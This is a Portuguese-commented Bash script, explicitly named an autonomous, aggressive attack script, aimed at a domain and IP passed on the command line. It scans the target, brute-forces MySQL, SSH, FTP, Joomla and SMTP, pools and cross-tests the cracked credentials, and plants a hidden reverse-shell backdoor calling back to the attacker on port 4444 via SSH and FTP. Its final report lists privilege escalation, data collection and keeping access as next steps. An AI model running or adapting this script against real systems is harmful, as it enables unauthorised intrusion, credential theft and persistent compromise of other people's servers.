#!/bin/bash

################################################################################
# SCRIPT DE ATAQUE GERAL AUTÔNOMO - TODOS OS VETORES
# Descrição: Ataque completo e agressivo usando todos os vetores identificados
################################################################################

# Solicitar target e IP do usuário
if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Uso: $0 <DOMINIO> <IP>"
    echo "Exemplo: $0 exemplo.com.br 192.168.1.100"
    exit 1
fi

TARGET="$1"
IP="$2"
LOG_DIR="./logs_geral"
RESULTS_FILE="$LOG_DIR/ataque_geral_results.txt"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     SCRIPT DE ATAQUE AUTÔNOMO E AGRESSIVO - GERAL           ║"
echo "║     Target: $TARGET                    ║"
echo "║     Data: $(date)                      ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

mkdir -p $LOG_DIR

# Função para log
log() {
    echo -e "$1" | tee -a $RESULTS_FILE
}

log "${GREEN}[+] Iniciando ataque geral autônomo${NC}"
log "${GREEN}[+] Target: $TARGET ($IP)${NC}"
log "${GREEN}[+] Timestamp: $TIMESTAMP${NC}"

# Verificar e instalar todas as ferramentas necessárias
echo -e "${YELLOW}[*] Verificando e instalando ferramentas...${NC}"

check_and_install() {
    local tool=$1
    local install_cmd=$2
    
    if ! command -v $tool &> /dev/null; then
        echo -e "${YELLOW}[!] $tool não encontrado. Instalando...${NC}"
        eval $install_cmd 2>&1 | tee -a $LOG_DIR/install_$tool.log
        if [ $? -eq 0 ]; then
            log "${GREEN}[+] $tool instalado com sucesso${NC}"
        else
            log "${RED}[-] Falha ao instalar $tool${NC}"
        fi
    else
        log "${GREEN}[+] $tool encontrado${NC}"
    fi
}

# Instalar todas as ferramentas
check_and_install "nmap" "sudo apt-get update && sudo apt-get install -y nmap"
check_and_install "hydra" "sudo apt-get install -y hydra"
check_and_install "medusa" "sudo apt-get install -y medusa"
check_and_install "mysql" "sudo apt-get install -y mysql-client"
check_and_install "ftp" "sudo apt-get install -y ftp"
check_and_install "ssh" "sudo apt-get install -y openssh-client"
check_and_install "curl" "sudo apt-get install -y curl"
check_and_install "wget" "sudo apt-get install -y wget"
check_and_install "python3" "sudo apt-get install -y python3 python3-pip"
check_and_install "sqlmap" "sudo apt-get install -y sqlmap"
check_and_install "nikto" "sudo apt-get install -y nikto"
check_and_install "gobuster" "sudo apt-get install -y gobuster"
check_and_install "dirb" "sudo apt-get install -y dirb"
check_and_install "metasploit-framework" "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash"

# Instalar dependências Python
pip3 install requests beautifulsoup4 lxml 2>/dev/null

log "${GREEN}[+] Todas as ferramentas verificadas${NC}"

# FASE 1: RECONHECIMENTO COMPLETO
echo -e "${YELLOW}[*] FASE 1: Reconhecimento Completo${NC}"
echo "================================================"

# Nmap completo
log "${YELLOW}[*] Executando scan Nmap completo...${NC}"
nmap -sS -sV -sC -O -p- --script vuln $IP > $LOG_DIR/nmap_completo.txt 2>&1
nmap -sS -sV -p 21,22,25,26,53,80,110,143,443,465,587,993,995,2222,3306 --script vuln $IP > $LOG_DIR/nmap_services.txt 2>&1

# DNS Enumeration
log "${YELLOW}[*] Enumerando DNS...${NC}"
dnsenum $TARGET > $LOG_DIR/dnsenum.txt 2>&1 || echo "dnsenum não disponível"

# Web Enumeration
log "${YELLOW}[*] Enumerando aplicação web...${NC}"
gobuster dir -u https://$TARGET -w /usr/share/wordlists/dirb/common.txt -o $LOG_DIR/gobuster.txt 2>&1 &
dirb https://$TARGET -o $LOG_DIR/dirb.txt 2>&1 &

# Nikto
log "${YELLOW}[*] Executando Nikto...${NC}"
nikto -h https://$TARGET -o $LOG_DIR/nikto.txt 2>&1 &

wait

# FASE 2: ATAQUES PARALELOS
echo -e "${YELLOW}[*] FASE 2: Executando Ataques em Paralelo${NC}"
echo "================================================"

# Executar todos os scripts de ataque em paralelo
log "${YELLOW}[*] Iniciando ataques paralelos...${NC}"

# MySQL
if [ -f "ataque_mysql.sh" ]; then
    log "${YELLOW}[*] Executando ataque MySQL...${NC}"
    bash ataque_mysql.sh "$TARGET" "$IP" > $LOG_DIR/mysql_attack.log 2>&1 &
    MYSQL_PID=$!
fi

# SSH
if [ -f "ataque_ssh.sh" ]; then
    log "${YELLOW}[*] Executando ataque SSH...${NC}"
    bash ataque_ssh.sh "$TARGET" "$IP" > $LOG_DIR/ssh_attack.log 2>&1 &
    SSH_PID=$!
fi

# FTP
if [ -f "ataque_ftp.sh" ]; then
    log "${YELLOW}[*] Executando ataque FTP...${NC}"
    bash ataque_ftp.sh "$TARGET" > $LOG_DIR/ftp_attack.log 2>&1 &
    FTP_PID=$!
fi

# Joomla
if [ -f "ataque_joomla.sh" ]; then
    log "${YELLOW}[*] Executando ataque Joomla...${NC}"
    bash ataque_joomla.sh "$TARGET" > $LOG_DIR/joomla_attack.log 2>&1 &
    JOOMLA_PID=$!
fi

# SMTP
if [ -f "ataque_smtp.sh" ]; then
    log "${YELLOW}[*] Executando ataque SMTP...${NC}"
    bash ataque_smtp.sh "$TARGET" "$IP" > $LOG_DIR/smtp_attack.log 2>&1 &
    SMTP_PID=$!
fi

# Aguardar todos os processos
log "${YELLOW}[*] Aguardando conclusão dos ataques...${NC}"
wait

# FASE 3: CONSOLIDAÇÃO DE RESULTADOS
echo -e "${YELLOW}[*] FASE 3: Consolidando Resultados${NC}"
echo "================================================"

log "${YELLOW}[*] Coletando credenciais encontradas...${NC}"

# Coletar todas as credenciais
CREDS_FILE="$LOG_DIR/todas_credenciais.txt"
> $CREDS_FILE

# MySQL
if [ -f "logs_mysql/credentials.txt" ]; then
    echo "=== MySQL CREDENTIALS ===" >> $CREDS_FILE
    cat logs_mysql/credentials.txt >> $CREDS_FILE
    echo "" >> $CREDS_FILE
fi

# SSH
if [ -f "logs_ssh/credentials.txt" ]; then
    echo "=== SSH CREDENTIALS ===" >> $CREDS_FILE
    cat logs_ssh/credentials.txt >> $CREDS_FILE
    echo "" >> $CREDS_FILE
fi

# FTP
if [ -f "logs_ftp/credentials.txt" ]; then
    echo "=== FTP CREDENTIALS ===" >> $CREDS_FILE
    cat logs_ftp/credentials.txt >> $CREDS_FILE
    echo "" >> $CREDS_FILE
fi

# SMTP
if [ -f "logs_smtp/credentials.txt" ]; then
    echo "=== SMTP CREDENTIALS ===" >> $CREDS_FILE
    cat logs_smtp/credentials.txt >> $CREDS_FILE
    echo "" >> $CREDS_FILE
fi

if [ -s "$CREDS_FILE" ]; then
    log "${GREEN}[+] Credenciais encontradas e consolidadas!${NC}"
    cat $CREDS_FILE | tee -a $RESULTS_FILE
else
    log "${YELLOW}[!] Nenhuma credencial encontrada${NC}"
fi

# FASE 4: EXPLORAÇÃO AVANÇADA
echo -e "${YELLOW}[*] FASE 4: Exploração Avançada${NC}"
echo "================================================"

# Se temos credenciais, tentar exploração cruzada
if [ -s "$CREDS_FILE" ]; then
    log "${GREEN}[+] Tentando exploração cruzada com credenciais encontradas...${NC}"
    
    # Tentar usar credenciais MySQL em SSH
    if [ -f "logs_mysql/credentials.txt" ]; then
        while IFS=: read -r user pass; do
            log "${YELLOW}[*] Testando credenciais MySQL ($user:$pass) em SSH...${NC}"
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $user@$IP "id" 2>&1 | grep -v "Permission denied" && {
                log "${GREEN}[+] Credenciais funcionam em SSH!${NC}"
            }
        done < logs_mysql/credentials.txt 2>/dev/null
    fi
    
    # Tentar usar credenciais SSH em MySQL
    if [ -f "logs_ssh/credentials.txt" ]; then
        while IFS=: read -r user pass port; do
            log "${YELLOW}[*] Testando credenciais SSH ($user:$pass) em MySQL...${NC}"
            mysql -h $IP -u "$user" -p"$pass" --skip-ssl -e "SELECT 1;" 2>&1 | grep -v "Access denied" && {
                log "${GREEN}[+] Credenciais funcionam em MySQL!${NC}"
            }
        done < logs_ssh/credentials.txt 2>/dev/null
    fi
fi

# FASE 5: PÓS-EXPLORAÇÃO COMPLETA
echo -e "${YELLOW}[*] FASE 5: Pós-Exploração Completa${NC}"
echo "================================================"

if [ -s "$CREDS_FILE" ]; then
    log "${GREEN}[+] Iniciando pós-exploração completa...${NC}"
    
    # Criar script de backdoor universal
    cat > $LOG_DIR/backdoor_universal.sh << 'EOF'
#!/bin/bash
# Backdoor Universal
while true; do
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null
    sleep 60
done
EOF
    
    # Substituir IP do atacante
    ATTACKER_IP=$(hostname -I | awk '{print $1}')
    sed -i "s/ATTACKER_IP/$ATTACKER_IP/g" $LOG_DIR/backdoor_universal.sh
    
    # Tentar estabelecer persistência em todos os serviços comprometidos
    log "${YELLOW}[*] Estabelecendo persistência...${NC}"
    
    # Via SSH
    if [ -f "logs_ssh/credentials.txt" ]; then
        while IFS=: read -r user pass port; do
            log "${YELLOW}[*] Estabelecendo backdoor via SSH ($user@$IP:$port)...${NC}"
            sshpass -p "$pass" scp -o StrictHostKeyChecking=no -P $port $LOG_DIR/backdoor_universal.sh $user@$IP:/tmp/.backdoor.sh 2>&1 | tee -a $LOG_DIR/persistence.log
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$IP -p $port "chmod +x /tmp/.backdoor.sh && nohup /tmp/.backdoor.sh > /dev/null 2>&1 &" 2>&1 | tee -a $LOG_DIR/persistence.log
        done < logs_ssh/credentials.txt 2>/dev/null
    fi
    
    # Via FTP
    if [ -f "logs_ftp/credentials.txt" ]; then
        while IFS=: read -r user pass; do
            log "${YELLOW}[*] Estabelecendo backdoor via FTP ($user@$IP)...${NC}"
            ftp -n $IP 21 << EOF 2>&1 | tee -a $LOG_DIR/persistence.log
user $user $pass
binary
put $LOG_DIR/backdoor_universal.sh /tmp/.backdoor.sh
quit
EOF
        done < logs_ftp/credentials.txt 2>/dev/null
    fi
fi

# FASE 6: RELATÓRIO FINAL
echo -e "${YELLOW}[*] FASE 6: Gerando Relatório Final${NC}"
echo "================================================"

REPORT_FILE="$LOG_DIR/relatorio_final_$TIMESTAMP.txt"

cat > $REPORT_FILE << EOF
╔══════════════════════════════════════════════════════════════╗
║           RELATÓRIO FINAL DE ATAQUE                          ║
║           Target: $TARGET                                    ║
║           Data: $(date)                                      ║
╚══════════════════════════════════════════════════════════════╝

=== RESUMO EXECUTIVO ===
Target: $TARGET ($IP)
Data do Ataque: $(date)
Duração: Verificar logs individuais

=== CREDENCIAIS COMPROMETIDAS ===
EOF

if [ -s "$CREDS_FILE" ]; then
    cat $CREDS_FILE >> $REPORT_FILE
else
    echo "Nenhuma credencial comprometida encontrada." >> $REPORT_FILE
fi

cat >> $REPORT_FILE << EOF

=== SERVIÇOS ATACADOS ===
1. MySQL (Porta 3306)
2. SSH (Portas 22, 2222)
3. FTP (Porta 21)
4. Joomla CMS (Portas 80, 443)
5. SMTP (Portas 25, 26, 587, 465)

=== VULNERABILIDADES EXPLORADAS ===
- MySQL exposto publicamente
- SSH desatualizado (se aplicável)
- FTP não criptografado (se aplicável)
- Joomla CMS (possivelmente desatualizado)
- SMTP (versões variadas)

=== ARQUIVOS DE LOG ===
- Nmap: $LOG_DIR/nmap_completo.txt
- MySQL: logs_mysql/
- SSH: logs_ssh/
- FTP: logs_ftp/
- Joomla: logs_joomla/
- SMTP: logs_smtp/

=== PRÓXIMOS PASSOS ===
1. Revisar todas as credenciais encontradas
2. Estabelecer sessões persistentes
3. Escalar privilégios onde possível
4. Coletar dados sensíveis
5. Manter acesso para futuras operações

EOF

log "${GREEN}[+] Relatório final gerado: $REPORT_FILE${NC}"

# RESUMO FINAL
echo ""
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║           ATAQUE GERAL CONCLUÍDO                             ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${GREEN}[+] Logs salvos em: $LOG_DIR${NC}"
echo -e "${GREEN}[+] Relatório final: $REPORT_FILE${NC}"
echo -e "${GREEN}[+] Credenciais: $CREDS_FILE${NC}"
echo ""
echo -e "${YELLOW}[*] Estrutura de logs:${NC}"
ls -lah $LOG_DIR/
echo ""
echo -e "${YELLOW}[*] Resumo por serviço:${NC}"
[ -d "logs_mysql" ] && echo "MySQL: $(ls logs_mysql/ | wc -l) arquivos"
[ -d "logs_ssh" ] && echo "SSH: $(ls logs_ssh/ | wc -l) arquivos"
[ -d "logs_ftp" ] && echo "FTP: $(ls logs_ftp/ | wc -l) arquivos"
[ -d "logs_joomla" ] && echo "Joomla: $(ls logs_joomla/ | wc -l) arquivos"
[ -d "logs_smtp" ] && echo "SMTP: $(ls logs_smtp/ | wc -l) arquivos"
echo ""

